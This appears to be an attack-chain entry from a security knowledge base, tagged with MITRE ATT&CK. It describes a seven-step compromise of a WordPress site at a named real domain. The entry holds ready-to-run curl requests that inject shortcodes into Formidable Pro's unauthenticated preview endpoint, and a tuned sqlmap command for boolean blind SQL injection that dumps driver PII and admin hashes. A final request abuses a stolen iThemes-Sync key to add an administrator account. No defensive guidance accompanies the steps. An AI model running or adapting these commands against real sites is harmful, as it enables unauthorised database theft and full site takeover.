---
tags:
  - sqli
  - blind-sqli
  - wordpress
  - rce
  - auth-bypass
  - ithemes-sync
  - formidable-pro
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/sqlmap]]'
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Verify-Formidable-Forms-Preview-Endpoint]]'
  - '[[procedures/Test-Shortcode-Injection-in-Preview]]'
  - '[[procedures/Trigger-SQL-Error-in-Display-Frm-Data]]'
  - '[[procedures/Exploit-Blind-SQLi-with-Sqlmap]]'
  - '[[procedures/Extract-iThemes-Sync-Auth-Key]]'
  - '[[procedures/Achieve-RCE-via-iThemes-Sync-Bypass]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:15:10.014Z'
description: >-
  A multi-stage attack exploiting blind SQL injection in the Formidable Pro
  plugin's form preview endpoint to dump the WordPress database, extract
  plaintext iThemes-Sync authentication keys, and achieve remote code execution
  by adding an administrator user.
id: da5559e5-eff2-463f-88ff-57cba7e4f3e4
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
---
# Blind SQL Injection in Formidable Pro WordPress Plugin Leading to RCE via iThemes-Sync

Multi-stage attack chain exploiting an unauthenticated blind SQL injection in the Formidable Pro WordPress plugin's AJAX form preview endpoint. The attack begins with reconnaissance of the endpoint, progresses to shortcode injection for SQL manipulation, uses sqlmap for blind boolean-based exploitation to dump database contents including PII and authentication keys, and culminates in authentication bypass of iThemes-Sync for remote code execution, such as adding administrator users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Verify Endpoint] --> B[Discovery: Test Shortcode Injection]
    B --> C[Execution: Trigger SQL Error]
    C --> D[Collection: Exploit Blind SQLi]
    D --> E[Privilege Escalation: Extract Auth Key]
    E --> F[Execution: RCE via Auth Bypass]
    F --> G[Impact: Full Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/sqlmap]]
- [[tools/PHP]]

### Target Environment

- WordPress with Formidable Pro plugin (version vulnerable to shortcode param injection)
- iThemes-Sync plugin installed with plaintext keys in wp_options
- MySQL backend database
- Network access to the web application (ports 80/443)

### Initial Access Requirements

- No credentials required (unauthenticated endpoint)
- Direct internet access to the target site
- No prior access needed

## Detailed Attack Procedures

### Step 1: Verify Form Preview Endpoint Accessibility
procedure: [[procedures/Verify-Formidable-Forms-Preview-Endpoint]]

**Objective**: Confirm the unauthenticated AJAX endpoint for form previews is accessible and renders a default form.

**Instructions**: Use [[commands/curl-verify-ajax-preview]] to send a POST request to the endpoint:

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
```

**Expected Output**: HTTP 200 response with HTML containing the default 'contact us' form.

**Success Indicators**:
- Endpoint returns form HTML without authentication errors
- Confirms Formidable Pro plugin is active

### Step 2: Test Custom HTML Injection After Form
procedure: [[procedures/Test-Shortcode-Injection-in-Preview]]

**Objective**: Validate that custom content can be injected via the after_html parameter and rendered post-form.

**Instructions**: Execute [[commands/curl-test-after-html]] to append benign content:

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
```

**Expected Output**: HTML response with 'hello world' text appearing after the form elements.

**Success Indicators**:
- Injected text renders in the output
- No sanitization blocking custom HTML

### Step 3: Inject Display-Frm-Data Shortcode
procedure: [[procedures/Test-Shortcode-Injection-in-Preview]]

**Objective**: Inject the [display-frm-data] shortcode via after_html to render form entries, setting up for parameter manipulation.

**Instructions**: Run [[commands/curl-inject-display-shortcode]] with the shortcode for form ID 835:

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
```

**Expected Output**: HTML with form entries listed between XXX and YYY markers.

**Success Indicators**:
- Shortcode executes and displays entries
- Confirms shortcode parameters are processed

### Step 4: Trigger SQL Error with Malicious Order Parameters
procedure: [[procedures/Trigger-SQL-Error-in-Display-Frm-Data]]

**Objective**: Inject invalid order parameter to cause an SQL error, confirming vulnerability in ORDER BY clause handling.

**Instructions**: Use [[commands/curl-trigger-sql-error]] to inject 'order=zzz':

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
```

**Expected Output**: No direct error in response, but SQL syntax error logged on server (verifiable via access logs if available).

**Success Indicators**:
- Response lacks expected entries due to query failure
- Server logs show MySQL ORDER BY error

### Step 5: Exploit Blind SQLi to Dump Database
procedure: [[procedures/Exploit-Blind-SQLi-with-Sqlmap]]

**Objective**: Use sqlmap for boolean-based blind SQLi to extract database schema, tables, admin hashes, and PII.

**Instructions**: Launch [[commands/sqlmap-blind-sqli-exploit]] with custom eval and tamper:

```bash
./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",":-it.id%2b");order_by="id,"*true.count(",")+"id"' --test-filter DUAL --tamper commalesslimit -D [REDACTED] --sql-query "SELECT [REDACTED] FROM [REDACTED] WHERE id=2"
```

**Expected Output**: Sqlmap dumps tables, hashes, webroot path, and PII like names/emails for ~6000 drivers.

**Success Indicators**:
- Boolean conditions return true/false based on queries
- Data extracted confirms MySQL backend and full read access

### Step 6: Extract iThemes-Sync Authentication Key
procedure: [[procedures/Extract-iThemes-Sync-Auth-Key]]

**Objective**: Query wp_options table via SQLi to retrieve plaintext iThemes-Sync key and user ID.

**Instructions**: Execute [[commands/sql-query-ithemes-cache]] within sqlmap or directly via injection:

```sql
SELECT option_value FROM [REDACTED] WHERE option_name='ithemes-sync-cache'
```

**Expected Output**: Serialized PHP array with authentications, key, timestamp, local_user, and username.

**Success Indicators**:
- Key and user_id (e.g., 123) retrieved
- Enables pivot to iThemes-Sync exploitation

### Step 7: Achieve RCE via iThemes-Sync Bypass
procedure: [[procedures/Achieve-RCE-via-iThemes-Sync-Bypass]]

**Objective**: Use extracted key to authenticate and add a new admin user, leading to full RCE.

**Instructions**: Run [[commands/php-rce-poc-script]] to compute hash and send request, or test with [[commands/curl-ithemes-sync-test]]:

```bash
<?php // PHP script to add new admin user using key and user_id; computes hash and sends curl POST to https://www.drivegrab.com/?ithemes-sync-reques%74=1 with X-Forwarded-For header ?>
```

Or:

```bash
curl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data 'request={"action":"manage-users","arguments":{},"user_id":"123","salt":"A","hash":"B"}' -H 'X-Forwarded-For: 123.1.2.3'
```

**Expected Output**: JSON response confirming user addition or auth errors; new admin user in WordPress.

**Success Indicators**:
- Hash validates and action executes
- New administrator account created, enabling plugin management and RCE

## Attack Chain Summary

### Key Achievements

1. Full read access to WordPress MySQL database via blind SQLi
2. Extraction of PII for ~6000 users and admin hashes
3. Authentication bypass in iThemes-Sync for RCE, including adding admins and managing plugins

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Data from Local System]] Data from Local System
- [[Valid Accounts]] Valid Accounts
- [[Command-Line Interface]] Command and Scripting Interpreter

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
